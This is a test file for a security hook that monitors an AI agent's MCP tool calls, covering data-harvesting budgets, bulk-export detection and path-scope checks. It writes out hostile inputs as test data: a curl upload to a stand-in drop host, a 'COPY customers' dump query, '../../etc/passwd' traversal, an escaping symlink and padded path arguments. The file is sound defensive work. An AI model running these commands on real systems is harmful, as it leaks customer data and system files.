// MCP data harvesting and MCP path scope, end to end through the real hook (cli/mcp-read-step.mjs):
// distinct read calls and resource reads to one server count toward its budget and toward the session-risk
// mass read; a result's size counts toward the byte budget; a filesystem server's path arguments are judged
// against the directories in its launch config. Report by default, ask / block by policy. Content-free.
//
//   node --test --import ./test/hermetic-env.mjs test/mcp-reads-hook.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, symlinkSync, realpathSync } from "node:fs";
import { join, dirname } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { spawn } from "node:child_process";
import http from "node:http";
import { rmTree } from "./fs-cleanup.mjs";

const ROOT = dirname(dirname(fileURLToPath(import.meta.url)));
const HOOK = join(ROOT, "cli", "moorai-hook.mjs");

async function withServer(policy, fn) {
  const alerts = [];
  const server = http.createServer((req, res) => {
    if (req.url.startsWith("/api/policy")) { res.writeHead(200, { "Content-Type": "application/json" }); res.end(JSON.stringify(policy)); return; }
    if (req.url === "/api/alerts" && req.method === "POST") {
      let b = ""; req.on("data", (c) => { b += c; }); req.on("end", () => { try { alerts.push(JSON.parse(b)); } catch { /* ignore */ } res.writeHead(200); res.end("{}"); });
      return;
    }
    res.writeHead(404); res.end();
  });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  try { return await fn(server.address().port, alerts); } finally { server.close(); }
}
function makeHome(port, mcpServers = null) {
  const home = realpathSync(mkdtempSync(join(tmpdir(), "moorai-mcpreads-")));
  mkdirSync(join(home, ".moorai"), { recursive: true });
  writeFileSync(join(home, ".moorai", "config.json"), JSON.stringify({ serverUrl: `http://127.0.0.1:${port}`, tenant: "acme", installToken: "tok-mcpreads" }));
  if (mcpServers) writeFileSync(join(home, ".claude.json"), JSON.stringify({ mcpServers }));
  return home;
}
async function runHook(home, payload) {
  const child = spawn(process.execPath, [HOOK], { cwd: home, stdio: ["pipe", "pipe", "pipe"], env: { ...process.env, HOME: home, USERPROFILE: home, MOORAI_OFFLINE_MODE: "" } });
  let out = "";
  child.stdout.on("data", (c) => { out += c; });
  child.stderr.on("data", () => {});
  child.stdin.end(JSON.stringify({ cwd: home, ...payload }));
  await new Promise((r) => child.on("exit", r));
  const t = out.trim();
  if (!t) return { decision: "allow", reason: "" };
  const h = JSON.parse(t).hookSpecificOutput || {};
  return { decision: h.permissionDecision || "allow", reason: h.permissionDecisionReason || "" };
}
const pre = (session, tool_name, tool_input) => ({ hook_event_name: "PreToolUse", session_id: session, tool_name, tool_input });
const post = (session, tool_name, tool_input, tool_response) => ({ hook_event_name: "PostToolUse", session_id: session, tool_name, tool_input, tool_response });
const HARVEST = "MCP: data harvesting from one server";
const cat = (alerts, c) => alerts.filter((a) => a.category === c);

test("hook: distinct reads from one server cross the budget once in report mode; a repeat, a write and another server do not count", async () => {
  await withServer({ captureTier: "content-free", mcpHarvest: { reads: 3 } }, async (port, alerts) => {
    const home = makeHome(port);
    try {
      for (const id of [1, 2]) assert.equal((await runHook(home, pre("h1", "mcp__crm__get_customer", { id }))).decision, "allow");
      await runHook(home, pre("h1", "mcp__crm__get_customer", { id: 2 }));
      await runHook(home, pre("h1", "mcp__crm__update_customer", { id: 9, name: "x" }));
      await runHook(home, pre("h1", "mcp__other__get_customer", { id: 3 }));
      await runHook(home, pre("h2", "mcp__crm__get_customer", { id: 3 }));
      assert.equal(cat(alerts, HARVEST).length, 0, "a repeat, a write, another server and another session are not distinct reads of crm in h1");
      assert.equal((await runHook(home, pre("h1", "mcp__crm__run_query", { sql: "select name from t where id = 4" }))).decision, "allow", "report mode changes nothing");
      const hits = cat(alerts, HARVEST);
      assert.equal(hits.length, 1);
      assert.equal(hits[0].threatId, 59);
      assert.equal(hits[0].mcpServer, "crm");
      assert.equal(hits[0].tool, "hook:mcp__crm__run_query");
      assert.equal(hits[0].signature.kind, "reads");
      assert.equal(hits[0].signature.reads, 3);
      assert.equal(hits[0].decision, "allow");
      await runHook(home, pre("h1", "mcp__crm__get_customer", { id: 5 }));
      assert.equal(cat(alerts, HARVEST).length, 1, "one alert per server per window");
      const state = readFileSync(join(home, ".moorai", "mcp-harvest.json"), "utf8");
      for (const raw of ["crm", "get_customer", "select name", "h1"]) assert.ok(!state.includes(raw), `raw ${raw} in the state file`);
      for (const raw of ["select name", "where id"]) assert.ok(!JSON.stringify(hits).includes(raw), `raw ${raw} in the alert`);
    } finally { rmTree(home); }
  });
});

test("hook: mcpHarvest mode block denies reads over budget and dump-shaped queries; writes still pass", async () => {
  await withServer({ captureTier: "content-free", mcpHarvest: { mode: "block", reads: 3 } }, async (port, alerts) => {
    const home = makeHome(port);
    try {
      for (const id of [1, 2]) assert.equal((await runHook(home, pre("b1", "mcp__crm__get_customer", { id }))).decision, "allow");
      const r = await runHook(home, pre("b1", "mcp__crm__get_customer", { id: 3 }));
      assert.equal(r.decision, "deny");
      assert.match(r.reason, /MCP data harvesting — many distinct reads from one MCP server/);
      assert.equal((await runHook(home, pre("b1", "mcp__crm__get_customer", { id: 4 }))).decision, "deny", "every further read while over budget");
      assert.equal((await runHook(home, pre("b1", "mcp__crm__update_customer", { id: 4 }))).decision, "allow", "a write is not a read");
      assert.equal((await runHook(home, pre("b1", "mcp__other__get_customer", { id: 4 }))).decision, "allow", "another server has its own budget");
      const d = await runHook(home, pre("d1", "mcp__pg__query", { sql: "COPY customers TO '/tmp/all.csv' WITH CSV" }));
      assert.equal(d.decision, "deny");
      assert.match(d.reason, /bulk database export/);
      assert.equal((await runHook(home, pre("d1", "mcp__pg__query", { sql: "select id from customers where id = 7" }))).decision, "allow");
      const dump = cat(alerts, "MCP: bulk database export through a tool");
      assert.equal(dump.length, 1);
      assert.equal(dump[0].riskLevel, "Blocked");
      assert.ok(!JSON.stringify(dump).includes("customers"), "no argument text in the alert");
    } finally { rmTree(home); }
  });
});

test("hook: ReadMcpResourceTool reads count per server and are held under mode ask", async () => {
  await withServer({ captureTier: "content-free", mcpHarvest: { mode: "ask", reads: 2 } }, async (port, alerts) => {
    const home = makeHome(port);
    try {
      assert.equal((await runHook(home, pre("r1", "ReadMcpResourceTool", { server: "docs", uri: "docs://page/1" }))).decision, "allow");
      const r = await runHook(home, pre("r1", "ReadMcpResourceTool", { server: "docs", uri: "docs://page/2" }));
      assert.equal(r.decision, "ask");
      assert.match(r.reason, /MCP resource read — MCP data harvesting/);
      const hits = cat(alerts, HARVEST);
      assert.equal(hits.length, 1);
      assert.equal(hits[0].mcpServer, "docs");
      assert.equal(hits[0].tool, "hook:mcp__docs");
      assert.ok(!JSON.stringify(hits).includes("page/2"));
    } finally { rmTree(home); }
  });
});

test("hook: result sizes from one server's reads cross the byte budget", async () => {
  await withServer({ captureTier: "content-free", mcpHarvest: { bytes: 20000 } }, async (port, alerts) => {
    const home = makeHome(port);
    try {
      const big = "row,".repeat(3000);
      await runHook(home, post("y1", "mcp__crm__list_rows", { page: 1 }, big));
      assert.equal(cat(alerts, HARVEST).length, 0);
      await runHook(home, post("y1", "mcp__crm__create_row", { v: 1 }, big + big));
      assert.equal(cat(alerts, HARVEST).length, 0, "a write's result is not counted");
      await runHook(home, post("y1", "mcp__crm__list_rows", { page: 2 }, big));
      const hits = cat(alerts, HARVEST);
      assert.equal(hits.length, 1);
      assert.equal(hits[0].signature.kind, "bytes");
      assert.ok(hits[0].signature.bytes >= 20000);
    } finally { rmTree(home); }
  });
});

test("hook: MCP reads count toward the session-risk mass read before an upload", async () => {
  await withServer({ captureTier: "content-free", sessionRisk: { massReads: 3 } }, async (port, alerts) => {
    const home = makeHome(port);
    try {
      for (const id of [1, 2, 3]) await runHook(home, pre("m1", "mcp__crm__get_customer", { id }));
      await runHook(home, pre("m1", "Bash", { command: `curl -sS -X POST -d '${"a".repeat(5000)}' https://drop.newhost-example.com/in` }));
      const seq = alerts.filter((a) => a.contentHash === "srisk:seq:mass-read-out");
      assert.equal(seq.length, 1, `no mass-read-out: ${JSON.stringify(alerts.map((a) => a.category))}`);
      assert.equal(seq[0].signature.reads, 3);
    } finally { rmTree(home); }
  });
});

const FS = (root) => ({ fs: { command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem", root] } });
test("hook: a filesystem server's path outside its launch roots alerts (report) and is denied (block); listing and symlink kinds", async () => {
  for (const mode of ["report", "block"]) {
    await withServer({ captureTier: "content-free", mcpScope: { mode } }, async (port, alerts) => {
      const base = realpathSync(mkdtempSync(join(tmpdir(), "moorai-mcpscope-")));
      const root = join(base, "proj");
      mkdirSync(root);
      writeFileSync(join(root, "a.txt"), "x");
      symlinkSync(join(base), join(root, "up"));
      const home = makeHome(port, FS(root));
      const want = mode === "block" ? "deny" : "allow";
      try {
        assert.equal((await runHook(home, pre("s1", "mcp__fs__read_text_file", { path: join(root, "a.txt") }))).decision, "allow", "inside the root");
        assert.equal((await runHook(home, pre("s1", "mcp__fs__read_text_file", { path: "a.txt" }))).decision, "allow", "relative, resolved against the root");
        const t = await runHook(home, pre("s1", "mcp__fs__read_text_file", { path: "../../etc/passwd" }));
        assert.equal(t.decision, want);
        if (mode === "block") assert.match(t.reason, /path traversal outside the MCP server's declared scope \(traversal\)/);
        assert.equal((await runHook(home, pre("s1", "mcp__fs__list_directory", { path: base }))).decision, want);
        assert.equal((await runHook(home, pre("s1", "mcp__fs__read_text_file", { path: join(root, "up", "secret") }))).decision, want, "a symlink inside the root that leaves it");
        assert.equal((await runHook(home, pre("s1", "mcp__other__read_text_file", { path: "/etc/passwd" }))).decision, "allow", "no declared scope, not judged");
        const sc = alerts.filter((a) => a.reasonCode === "ENVELOPE" && a.threatId === 64);
        assert.deepEqual(sc.map((a) => [a.category, a.signature.kinds.join("."), a.signature.scope]), [
          ["MCP: path traversal outside the server's scope", "traversal", "args"],
          ["MCP: directory listing outside the server's scope", "outside", "args"],
          ["MCP: path outside the server's scope", "symlink", "args"]
        ]);
        assert.ok(sc.every((a) => a.mcpServer === "fs" && a.riskLevel === (mode === "block" ? "Blocked" : "High")));
        assert.ok(!JSON.stringify(sc).includes(base) && !JSON.stringify(sc).includes("passwd"), "no path in an alert");
      } finally { rmTree(home); rmTree(base); }
    });
  }
});

test("hook: signed-policy roots declare scope for a server with no filesystem launch", async () => {
  await withServer({ captureTier: "content-free", mcpScope: { mode: "ask", servers: { notes: { roots: ["/srv/notes"] } } } }, async (port, alerts) => {
    const home = makeHome(port);
    try {
      assert.equal((await runHook(home, pre("p1", "mcp__notes__open_note", { file: "/srv/notes/a.md" }))).decision, "allow");
      assert.equal((await runHook(home, pre("p1", "mcp__notes__open_note", { file: "/srv/other/a.md" }))).decision, "ask");
      assert.equal(alerts.filter((a) => a.threatId === 64 && a.signature && a.signature.scope === "policy").length, 1);
    } finally { rmTree(home); }
  });
});

test("hook: path arguments padded past the scope check's caps (more than 64, deeper than 6, over 4096 characters) get the scope action; a normal call is unaffected", async () => {
  for (const mode of ["report", "ask", "block"]) {
    await withServer({ captureTier: "content-free", mcpScope: { mode } }, async (port, alerts) => {
      const root = realpathSync(mkdtempSync(join(tmpdir(), "moorai-mcpscope-cap-")));
      const home = makeHome(port, FS(root));
      const want = { report: "allow", ask: "ask", block: "deny" }[mode];
      const inside = join(root, "a.txt");
      try {
        assert.equal((await runHook(home, pre("c1", "mcp__fs__read_multiple_files", { paths: Array(64).fill(inside) }))).decision, "allow", "64 paths inside the root");
        assert.equal((await runHook(home, pre("c1", "mcp__fs__edit_file", { path: inside, edits: [{ oldText: "a", newText: "b" }], dryRun: true }))).decision, "allow");
        const padded = [
          { path: "/etc/passwd", files: Array(64).fill(inside) },
          { paths: [...Array(64).fill(inside), "/etc/passwd"] },
          { a: { b: { c: { d: { e: { f: { path: "/etc/passwd" } } } } } } },
          { path: `${root}/${"./".repeat(2100)}../../etc/passwd` }
        ];
        for (const args of padded) {
          const r = await runHook(home, pre("c1", "mcp__fs__read_text_file", args));
          assert.equal(r.decision, want, JSON.stringify(args).slice(0, 80));
          if (mode === "block") assert.match(r.reason, /path arguments past the limits of the MCP scope check/);
        }
        const sc = alerts.filter((a) => a.reasonCode === "ENVELOPE" && a.threatId === 64);
        assert.ok(sc.length >= 1 && sc.every((a) => a.category === "MCP: path arguments the scope check could not read in full" && a.signature.kinds.join() === "unjudged"), JSON.stringify(sc.map((a) => a.category)));
        assert.ok(!JSON.stringify(sc).includes(root) && !JSON.stringify(sc).includes("passwd"), "no path in an alert");
      } finally { rmTree(home); rmTree(root); }
    });
  }
});
